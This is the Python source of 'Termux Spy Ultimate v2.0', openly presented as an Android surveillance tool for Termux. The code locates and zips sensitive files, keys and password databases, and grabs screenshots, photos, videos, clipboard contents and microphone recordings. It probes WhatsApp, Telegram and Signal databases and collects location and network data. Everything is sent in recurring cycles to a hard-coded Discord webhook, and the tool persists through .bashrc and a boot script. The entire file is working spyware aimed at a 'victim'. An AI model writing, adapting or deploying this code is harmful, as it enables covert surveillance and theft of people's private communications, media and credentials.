#!/usr/bin/env python3
"""
Termux Spy Ultimate v2.0
Complete Android surveillance toolkit with Discord webhook exfiltration
"""

import os
import sys
import json
import base64
import subprocess
import threading
import time
import hashlib
import requests
import socket
import platform
import re
import getpass
import zipfile
import io
import mimetypes
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# ======= WEBHOOK CONFIGURATION =======
WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"
VICTIM_ID = hashlib.md5((socket.gethostname() + str(time.time())).encode()).hexdigest()[:12]

# ======= TERMUX PATHS =======
TERMUX_PATHS = {
    'home': '/data/data/com.termux/files/home',
    'storage': '/data/data/com.termux/files/home/storage',
    'shared': '/data/data/com.termux/files/home/storage/shared',
    'downloads': '/data/data/com.termux/files/home/storage/shared/Download',
    'dcim': '/data/data/com.termux/files/home/storage/shared/DCIM',
    'pictures': '/data/data/com.termux/files/home/storage/shared/Pictures',
    'movies': '/data/data/com.termux/files/home/storage/shared/Movies',
    'music': '/data/data/com.termux/files/home/storage/shared/Music',
    'whatsapp': '/data/data/com.termux/files/home/storage/shared/WhatsApp',
    'telegram': '/data/data/com.termux/files/home/storage/shared/Telegram',
    'signal': '/data/data/com.termux/files/home/storage/shared/Signal',
    'documents': '/data/data/com.termux/files/home/storage/shared/Documents'
}

class TermuxUltimateSpy:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36'
        })
        self.running = True
        self.webhook_queue = []
        self.executor = ThreadPoolExecutor(max_workers=10)
        
    def send_webhook(self, content=None, embed=None, files=None, username="Termux Spy"):
        """Send data to Discord webhook with retry"""
        try:
            payload = {
                'username': username,
                'avatar_url': 'https://cdn-icons-png.flaticon.com/512/5968/5968520.png'
            }
            
            if content:
                payload['content'] = content
            if embed:
                payload['embeds'] = [embed]
            
            response = None
            if files:
                response = self.session.post(WEBHOOK_URL, files=files, timeout=30)
            else:
                response = self.session.post(WEBHOOK_URL, json=payload, timeout=30)
            
            if response.status_code == 204 or response.status_code == 200:
                return True
            else:
                print(f"[-] Webhook error: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Send error: {e}")
            return False
    
    def send_large_data(self, data, title, description=""):
        """Send large data as multiple embeds/files"""
        if len(data) > 2000:
            # Split into chunks
            chunks = [data[i:i+1900] for i in range(0, len(data), 1900)]
            for i, chunk in enumerate(chunks):
                embed = {
                    'title': f"{title} (Part {i+1})",
                    'description': f'```{chunk}```',
                    'color': 0x5865F2,
                    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ')
                }
                self.send_webhook(embed=embed)
        else:
            embed = {
                'title': title,
                'description': f'```{data}```',
                'color': 0x5865F2,
                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ')
            }
            self.send_webhook(embed=embed)
    
    def send_file_discord(self, file_path, filename=None):
        """Send file directly to Discord"""
        try:
            if not os.path.exists(file_path):
                return False
            
            file_size = os.path.getsize(file_path)
            if file_size > 25 * 1024 * 1024:  # 25MB limit
                print(f"[-] File too large: {file_size}")
                return False
            
            if filename is None:
                filename = os.path.basename(file_path)
            
            with open(file_path, 'rb') as f:
                files = {
                    'file': (filename, f.read())
                }
            
            embed = {
                'title': f'📁 File Uploaded: {filename}',
                'description': f'Size: {file_size:,} bytes',
                'color': 0x00FF00,
                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ')
            }
            
            return self.send_webhook(embed=embed, files={'file': (filename, files['file'][1])})
            
        except Exception as e:
            print(f"[-] File send error: {e}")
            return False
    
    def establish_persistence(self):
        """Add multiple persistence methods"""
        try:
            # Method 1: .bashrc
            bashrc = os.path.join(TERMUX_PATHS['home'], '.bashrc')
            current_file = os.path.abspath(__file__)
            
            with open(bashrc, 'a') as f:
                f.write(f'\n# Auto-start\n')
                f.write(f'nohup python3 {current_file} --silent > /dev/null 2>&1 &\n')
            
            # Method 2: Termux boot script
            boot_dir = os.path.join(TERMUX_PATHS['home'], '.termux/boot')
            os.makedirs(boot_dir, exist_ok=True)
            
            boot_script = os.path.join(boot_dir, 'start_spy')
            with open(boot_script, 'w') as f:
                f.write('#!/data/data/com.termux/files/usr/bin/sh\n')
                f.write(f'python3 {current_file} --silent &\n')
            
            subprocess.run(['chmod', '+x', boot_script])
            
            # Method 3: Cron job
            cron_cmd = f'@reboot python3 {current_file} --silent'
            subprocess.run(['crontab', '-l'], stdout=subprocess.PIPE)
            
            return True
            
        except Exception as e:
            print(f"[-] Persistence error: {e}")
            return False
    
    def gather_comprehensive_info(self):
        """Gather ALL system information"""
        info = {
            'victim_id': VICTIM_ID,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'system': {},
            'network': {},
            'storage': {},
            'packages': {},
            'sensors': {},
            'battery': {},
            'location': {}
        }
        
        try:
            # === SYSTEM INFO ===
            info['system']['hostname'] = socket.gethostname()
            info['system']['user'] = getpass.getuser()
            info['system']['platform'] = platform.platform()
            info['system']['processor'] = platform.processor()
            
            # Android build info
            try:
                if os.path.exists('/system/build.prop'):
                    with open('/system/build.prop', 'r', encoding='latin-1') as f:
                        build_data = f.read()
                        info['system']['android_version'] = re.search(r'ro\.build\.version\.release=([^\n]+)', build_data)
                        info['system']['device_model'] = re.search(r'ro\.product\.model=([^\n]+)', build_data)
                        info['system']['manufacturer'] = re.search(r'ro\.product\.manufacturer=([^\n]+)', build_data)
                        info['system']['build_id'] = re.search(r'ro\.build\.id=([^\n]+)', build_data)
            except:
                pass
            
            # === NETWORK INFO ===
            try:
                # IP addresses
                info['network']['hostname'] = socket.gethostname()
                info['network']['local_ip'] = socket.gethostbyname(socket.gethostname())
                
                # Public IP
                try:
                    public_ip = requests.get('https://api.ipify.org', timeout=5).text
                    info['network']['public_ip'] = public_ip
                    
                    # Get IP info
                    ip_info = requests.get(f'https://ipinfo.io/{public_ip}/json', timeout=5).json()
                    info['network']['location'] = ip_info
                except:
                    pass
                
                # WiFi info
                try:
                    wifi_result = subprocess.run(['termux-wifi-connectioninfo'], 
                                               capture_output=True, text=True, timeout=5)
                    if wifi_result.returncode == 0:
                        info['network']['wifi'] = json.loads(wifi_result.stdout)
                except:
                    pass
                
                # Network interfaces
                try:
                    ifconfig = subprocess.run(['ifconfig'], capture_output=True, text=True)
                    info['network']['interfaces'] = ifconfig.stdout[:1000]
                except:
                    pass
                    
            except:
                pass
            
            # === STORAGE INFO ===
            try:
                df_result = subprocess.run(['df', '-h'], capture_output=True, text=True)
                info['storage']['df'] = df_result.stdout
                
                du_result = subprocess.run(['du', '-sh', TERMUX_PATHS['shared']], 
                                         capture_output=True, text=True)
                info['storage']['shared_size'] = du_result.stdout
            except:
                pass
            
            # === PACKAGES INFO ===
            try:
                pkg_list = subprocess.run(['pkg', 'list-installed'], 
                                        capture_output=True, text=True)
                info['packages']['installed'] = pkg_list.stdout[:3000]
                
                pip_list = subprocess.run(['pip', 'list'], 
                                        capture_output=True, text=True)
                info['packages']['pip'] = pip_list.stdout[:2000]
            except:
                pass
            
            # === SENSOR DATA ===
            try:
                sensor_result = subprocess.run(['termux-sensor'], 
                                             capture_output=True, text=True, timeout=5)
                if sensor_result.returncode == 0:
                    info['sensors']['available'] = sensor_result.stdout
            except:
                pass
            
            # === BATTERY INFO ===
            try:
                battery_result = subprocess.run(['termux-battery-status'], 
                                              capture_output=True, text=True, timeout=5)
                if battery_result.returncode == 0:
                    info['battery'] = json.loads(battery_result.stdout)
            except:
                pass
            
            # === LOCATION ===
            try:
                location_result = subprocess.run(['termux-location'], 
                                               capture_output=True, text=True, timeout=10)
                if location_result.returncode == 0:
                    info['location'] = json.loads(location_result.stdout)
            except:
                pass
            
            # === RUNNING PROCESSES ===
            try:
                ps_result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                info['system']['processes'] = ps_result.stdout[:2000]
            except:
                pass
            
        except Exception as e:
            info['error'] = str(e)
        
        return info
    
    def find_sensitive_files(self, extensions=None):
        """Find files by extensions with parallel processing"""
        if extensions is None:
            extensions = [
                '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.csv', '.json',
                '.jpg', '.jpeg', '.png', '.gif', '.mp4', '.avi', '.mov', '.mp3',
                '.db', '.sqlite', '.sqlite3', '.xml', '.html', '.htm', '.zip',
                '.rar', '.7z', '.apk', '.env', '.config', '.conf', '.ini',
                '.sh', '.bash', '.zsh', '.history', '.log', '.key', '.pem',
                '.crt', '.cer', '.p12', '.pfx', '.ovpn', '.kdbx'
            ]
        
        found_files = []
        
        def scan_directory(dir_path):
            local_files = []
            if os.path.exists(dir_path):
                for ext in extensions:
                    try:
                        for file_path in Path(dir_path).glob(f'**/*{ext}'):
                            if file_path.is_file():
                                file_size = file_path.stat().st_size
                                if 100 <= file_size <= 10 * 1024 * 1024:  # 100 bytes to 10MB
                                    local_files.append({
                                        'path': str(file_path),
                                        'size': file_size,
                                        'ext': ext
                                    })
                    except:
                        pass
            return local_files
        
        # Scan all directories in parallel
        futures = []
        for path in TERMUX_PATHS.values():
            futures.append(self.executor.submit(scan_directory, path))
        
        for future in as_completed(futures):
            found_files.extend(future.result())
        
        # Sort by size (largest first)
        found_files.sort(key=lambda x: x['size'], reverse=True)
        return found_files[:100]  # Limit to 100 files
    
    def capture_media(self):
        """Capture screenshots, photos, and videos"""
        media_files = []
        
        try:
            # Take screenshot using Termux API
            try:
                screenshot_path = os.path.join(TERMUX_PATHS['home'], 'screenshot.png')
                result = subprocess.run(['termux-screenshot', '-p', screenshot_path],
                                      capture_output=True, text=True, timeout=10)
                
                if os.path.exists(screenshot_path):
                    media_files.append(('📸 Screenshot', screenshot_path))
            except:
                pass
            
            # Copy recent photos
            dcim_path = TERMUX_PATHS['dcim']
            if os.path.exists(dcim_path):
                photos = list(Path(dcim_path).glob('**/*.jpg')) + list(Path(dcim_path).glob('**/*.png'))
                photos.sort(key=lambda x: x.stat().st_mtime, reverse=True)
                
                for photo in photos[:5]:  # Latest 5 photos
                    media_files.append(('📷 Photo', str(photo)))
            
            # Copy recent videos
            movies_path = TERMUX_PATHS['movies']
            if os.path.exists(movies_path):
                videos = list(Path(movies_path).glob('**/*.mp4')) + list(Path(movies_path).glob('**/*.avi'))
                videos.sort(key=lambda x: x.stat().st_mtime, reverse=True)
                
                for video in videos[:3]:  # Latest 3 videos
                    media_files.append(('🎬 Video', str(video)))
            
        except Exception as e:
            print(f"[-] Media capture error: {e}")
        
        return media_files
    
    def steal_communications(self):
        """Extract WhatsApp, Telegram, Signal data"""
        comm_data = {}
        
        apps = {
            'WhatsApp': TERMUX_PATHS['whatsapp'],
            'Telegram': TERMUX_PATHS['telegram'],
            'Signal': TERMUX_PATHS['signal']
        }
        
        for app_name, app_path in apps.items():
            if os.path.exists(app_path):
                try:
                    # Find databases
                    db_files = list(Path(app_path).glob('**/*.db')) + list(Path(app_path).glob('**/*.sqlite'))
                    
                    if db_files:
                        comm_data[app_name] = {
                            'database_count': len(db_files),
                            'databases': [str(db) for db in db_files[:3]],
                            'path': app_path
                        }
                        
                        # Try to read basic info from first database
                        if db_files:
                            try:
                                conn = sqlite3.connect(str(db_files[0]))
                                cursor = conn.cursor()
                                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                                tables = cursor.fetchall()
                                comm_data[app_name]['tables'] = [table[0] for table in tables[:10]]
                                conn.close()
                            except:
                                pass
                except:
                    pass
        
        return comm_data
    
    def record_environment(self):
        """Record audio and get clipboard"""
        recordings = {}
        
        try:
            # Record audio
            audio_file = os.path.join(TERMUX_PATHS['home'], f'audio_{int(time.time())}.aac')
            result = subprocess.run(['termux-microphone-record', '-f', audio_file, '-l', '15'],
                                  capture_output=True, text=True, timeout=20)
            
            if os.path.exists(audio_file):
                recordings['audio'] = audio_file
        
        except:
            pass
        
        try:
            # Get clipboard
            result = subprocess.run(['termux-clipboard-get'],
                                  capture_output=True, text=True)
            if result.stdout.strip():
                recordings['clipboard'] = result.stdout[:500]
        except:
            pass
        
        return recordings
    
    def create_smart_zip(self, files):
        """Create organized zip archive"""
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file_info in files:
                try:
                    file_path = file_info['path']
                    if os.path.exists(file_path):
                        with open(file_path, 'rb') as f:
                            content = f.read()
                        
                        # Create organized path in zip
                        rel_path = file_path.replace('/', '_').replace(' ', '_')
                        zip_file.writestr(f"collected/{rel_path}", content)
                except:
                    continue
        
        zip_buffer.seek(0)
        return zip_buffer
    
    def start_comprehensive_monitoring(self):
        """Start full monitoring cycle"""
        print(f"[+] Termux Spy Ultimate v2.0")
        print(f"[+] Victim ID: {VICTIM_ID}")
        print(f"[+] Webhook: {WEBHOOK_URL[:50]}...")
        
        # Initial embed
        embed = {
            'title': '🚀 Termux Spy Ultimate - Connected',
            'description': f'Victim ID: `{VICTIM_ID}`\nTimestamp: {time.strftime("%Y-%m-%d %H:%M:%S")}',
            'color': 0x00FF00,
            'thumbnail': {'url': 'https://cdn-icons-png.flaticon.com/512/5968/5968520.png'},
            'fields': [
                {'name': 'Status', 'value': '✅ Active', 'inline': True},
                {'name': 'Device', 'value': socket.gethostname(), 'inline': True}
            ]
        }
        self.send_webhook(embed=embed)
        
        cycle_count = 0
        
        while self.running:
            try:
                cycle_count += 1
                print(f"\n[+] Cycle #{cycle_count}")
                
                # === 1. SYSTEM INFO ===
                if cycle_count % 3 == 1:
                    print("[+] Gathering system information...")
                    system_info = self.gather_comprehensive_info()
                    
                    # Send as file
                    info_file = os.path.join(TERMUX_PATHS['home'], f'system_info_{cycle_count}.json')
                    with open(info_file, 'w') as f:
                        json.dump(system_info, f, indent=2)
                    
                    self.send_file_discord(info_file, "system_info.json")
                    os.remove(info_file)
                
                # === 2. FIND FILES ===
                if cycle_count % 2 == 0:
                    print("[+] Searching for sensitive files...")
                    files = self.find_sensitive_files()
                    
                    if files:
                        # Create and send zip
                        print(f"[+] Found {len(files)} files, creating zip...")
                        zip_buffer = self.create_smart_zip(files[:20])  # First 20 files
                        
                        zip_file_path = os.path.join(TERMUX_PATHS['home'], f'files_{cycle_count}.zip')
                        with open(zip_file_path, 'wb') as f:
                            f.write(zip_buffer.read())
                        
                        embed = {
                            'title': f'📁 Files Collected - Cycle {cycle_count}',
                            'description': f'Found **{len(files)}** files\nSending first 20 files...',
                            'color': 0xFFA500,
                            'fields': [
                                {'name': 'Total Files', 'value': str(len(files)), 'inline': True},
                                {'name': 'Total Size', 'value': f'{sum(f["size"] for f in files[:20]) / 1024 / 1024:.2f} MB', 'inline': True}
                            ]
                        }
                        self.send_webhook(embed=embed)
                        self.send_file_discord(zip_file_path, f"files_{cycle_count}.zip")
                        os.remove(zip_file_path)
                
                # === 3. CAPTURE MEDIA ===
                if cycle_count % 4 == 0:
                    print("[+] Capturing media...")
                    media_files = self.capture_media()
                    
                    for media_type, media_path in media_files:
                        if os.path.exists(media_path):
                            filename = f"{media_type.replace(' ', '_')}_{cycle_count}{os.path.splitext(media_path)[1]}"
                            self.send_file_discord(media_path, filename)
                
                # === 4. COMMUNICATIONS ===
                if cycle_count % 5 == 0:
                    print("[+] Extracting communications data...")
                    comm_data = self.steal_communications()
                    
                    if comm_data:
                        comm_file = os.path.join(TERMUX_PATHS['home'], f'communications_{cycle_count}.json')
                        with open(comm_file, 'w') as f:
                            json.dump(comm_data, f, indent=2)
                        
                        embed = {
                            'title': '💬 Communications Data',
                            'description': f'Found data from {len(comm_data)} apps',
                            'color': 0x9B59B6,
                            'fields': []
                        }
                        
                        for app, data in comm_data.items():
                            embed['fields'].append({
                                'name': app,
                                'value': f'{data.get("database_count", 0)} databases',
                                'inline': True
                            })
                        
                        self.send_webhook(embed=embed)
                        self.send_file_discord(comm_file, "communications.json")
                        os.remove(comm_file)
                
                # === 5. RECORDINGS ===
                if cycle_count % 6 == 0:
                    print("[+] Recording environment...")
                    recordings = self.record_environment()
                    
                    if 'audio' in recordings:
                        self.send_file_discord(recordings['audio'], f"recording_{cycle_count}.aac")
                        os.remove(recordings['audio'])
                    
                    if 'clipboard' in recordings:
                        embed = {
                            'title': '📋 Clipboard Content',
                            'description': f'```{recordings["clipboard"]}```',
                            'color': 0x3498DB
                        }
                        self.send_webhook(embed=embed)
                
                # === HEARTBEAT ===
                embed = {
                    'title': f'💓 Heartbeat - Cycle {cycle_count}',
                    'description': f'**Victim ID:** `{VICTIM_ID}`\n**Time:** {time.strftime("%H:%M:%S")}',
                    'color': 0x5865F2,
                    'footer': {'text': 'Termux Spy Ultimate - Active'}
                }
                self.send_webhook(embed=embed)
                
                print(f"[+] Cycle {cycle_count} completed")
                time.sleep(300)  # 5 minutes between cycles
                
            except KeyboardInterrupt:
                print("\n[!] Shutting down...")
                self.running = False
                break
            except Exception as e:
                print(f"[-] Cycle error: {e}")
                time.sleep(60)
    
    def quick_exfiltration(self):
        """Quick one-time data exfiltration"""
        print("[+] Starting quick exfiltration...")
        
        # Send startup message
        embed = {
            'title': '⚡ Quick Exfiltration Started',
            'description': f'Victim ID: `{VICTIM_ID}`',
            'color': 0xFF0000,
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ')
        }
        self.send_webhook(embed=embed)
        
        # 1. System info
        print("[1/5] System info...")
        system_info = self.gather_comprehensive_info()
        self.send_large_data(json.dumps(system_info, indent=2), "System Information")
        
        # 2. Files
        print("[2/5] Finding files...")
        files = self.find_sensitive_files()[:15]
        if files:
            zip_buffer = self.create_smart_zip(files)
            zip_path = os.path.join(TERMUX_PATHS['home'], 'quick_exfil.zip')
            with open(zip_path, 'wb') as f:
                f.write(zip_buffer.read())
            self.send_file_discord(zip_path, "sensitive_files.zip")
            os.remove(zip_path)
        
        # 3. Media
        print("[3/5] Capturing media...")
        media_files = self.capture_media()[:3]
        for media_type, media_path in media_files:
            self.send_file_discord(media_path, os.path.basename(media_path))
        
        # 4. Communications
        print("[4/5] Communications...")
        comm_data = self.steal_communications()
        if comm_data:
            self.send_large_data(json.dumps(comm_data, indent=2), "Communications Data")
        
        # 5. Environment
        print("[5/5] Environment...")
        recordings = self.record_environment()
        if 'clipboard' in recordings:
            embed = {
                'title': '📋 Clipboard Snapshot',
                'description': f'```{recordings["clipboard"]}```',
                'color': 0x3498DB
            }
            self.send_webhook(embed=embed)
        
        print("[+] Quick exfiltration completed!")

def main():
    """Main entry point"""
    # Check Termux
    if not os.path.exists('/data/data/com.termux'):
        print("[-] This tool requires Termux on Android!")
        sys.exit(1)
    
    spy = TermuxUltimateSpy()
    
    if len(sys.argv) > 1:
        if sys.argv[1] == '--quick':
            spy.quick_exfiltration()
        elif sys.argv[1] == '--persist':
            spy.establish_persistence()
            print("[+] Persistence installed")
        elif sys.argv[1] == '--silent':
            spy.start_comprehensive_monitoring()
        elif sys.argv[1] == '--clean':
            # Cleanup
            bashrc = os.path.join(TERMUX_PATHS['home'], '.bashrc')
            if os.path.exists(bashrc):
                with open(bashrc, 'r') as f:
                    lines = f.readlines()
                with open(bashrc, 'w') as f:
                    for line in lines:
                        if 'python3' not in line or 'nohup' not in line:
                            f.write(line)
            print("[+] Cleanup completed")
        else:
            print("Usage:")
            print("  python3 termux_spy.py --quick     # One-time exfiltration")
            print("  python3 termux_spy.py --persist   # Install persistence")
            print("  python3 termux_spy.py --silent    # Start monitoring")
            print("  python3 termux_spy.py --clean     # Remove traces")
    else:
        # Interactive mode
        print("\n" + "="*60)
        print("TERMUX SPY ULTIMATE v2.0")
        print("="*60)
        print(f"Victim ID: {VICTIM_ID}")
        print(f"Webhook: {WEBHOOK_URL[:40]}...")
        print("\nOptions:")
        print("  1. Quick exfiltration (one-time)")
        print("  2. Install persistence")
        print("  3. Start silent monitoring")
        print("  4. Clean traces")
        print("  5. Test webhook")
        print("  6. Exit")
        
        choice = input("\nSelect option (1-6): ").strip()
        
        if choice == '1':
            spy.quick_exfiltration()
        elif choice == '2':
            spy.establish_persistence()
        elif choice == '3':
            spy.start_comprehensive_monitoring()
        elif choice == '4':
            # Cleanup code
            pass
        elif choice == '5':
            embed = {
                'title': '✅ Webhook Test',
                'description': 'Termux Spy Ultimate is working!',
                'color': 0x00FF00
            }
            spy.send_webhook(embed=embed)
            print("[+] Test message sent!")
        elif choice == '6':
            print("[+] Exiting...")
        else:
            print("[-] Invalid choice")

if __name__ == "__main__":
    # Required packages check
    required = ['requests']
    for package in required:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            print(f"[!] Please install: pip install {package}")
    
    main()
